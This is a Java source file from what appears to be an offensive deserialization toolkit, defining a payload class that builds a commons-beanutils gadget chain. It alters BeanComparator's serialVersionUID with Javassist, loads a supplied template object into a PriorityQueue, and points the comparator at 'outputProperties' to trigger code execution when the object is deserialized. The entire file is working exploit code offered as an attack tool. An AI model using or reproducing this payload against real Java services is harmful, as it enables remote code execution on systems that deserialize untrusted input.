package com.summersec.attack.deser.payloads;

import com.summersec.attack.deser.payloads.annotation.Authors;
import com.summersec.attack.deser.payloads.annotation.Dependencies;
import com.summersec.attack.deser.util.JavassistClassLoader;
import com.summersec.attack.deser.util.Reflections;
import java.util.Comparator;
import java.util.PriorityQueue;
import java.util.Queue;

import com.summersec.attack.deser.util.StandardExecutorClassLoader;
import javassist.ClassClassPath;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtField;


@Dependencies({"commons-beanutils:commons-beanutils:1.6.1"})
@Authors({"phith0n"})
public class CommonsBeanutilsString_192s implements ObjectPayload<Queue<Object>> {
    @Override
    public Queue<Object> getObject(Object template) throws Exception {

        ClassPool pool = ClassPool.getDefault();
        pool.insertClassPath(new ClassClassPath(Class.forName("org.apache.commons.beanutils.BeanComparator")));
        final CtClass beanComparator = pool.get("org.apache.commons.beanutils.BeanComparator");

        try {
            CtField ctSUID = beanComparator.getDeclaredField("serialVersionUID");
            beanComparator.removeField(ctSUID);
        }catch (javassist.NotFoundException e){}
        beanComparator.addField(CtField.make("private static final long serialVersionUID = -3490850999041592962L;", beanComparator));
        // mock method name until armed
        final Comparator comparator = (Comparator)beanComparator.toClass(new JavassistClassLoader()).newInstance();
        beanComparator.defrost();

        PriorityQueue<String> queue = new PriorityQueue(2, (Comparator<?>)comparator);

        queue.add("1");
        queue.add("1");

        Reflections.setFieldValue(queue, "queue", new Object[] { template, template });

        Reflections.setFieldValue(beanComparator, "property", "outputProperties");

        return (Queue)queue;
    }

    public static void main(String[] args) throws Exception {
        CommonsBeanutilsString_192s commonsBeanutilsString192 = new CommonsBeanutilsString_192s();
        commonsBeanutilsString192.getObject(new Object());

    }
}



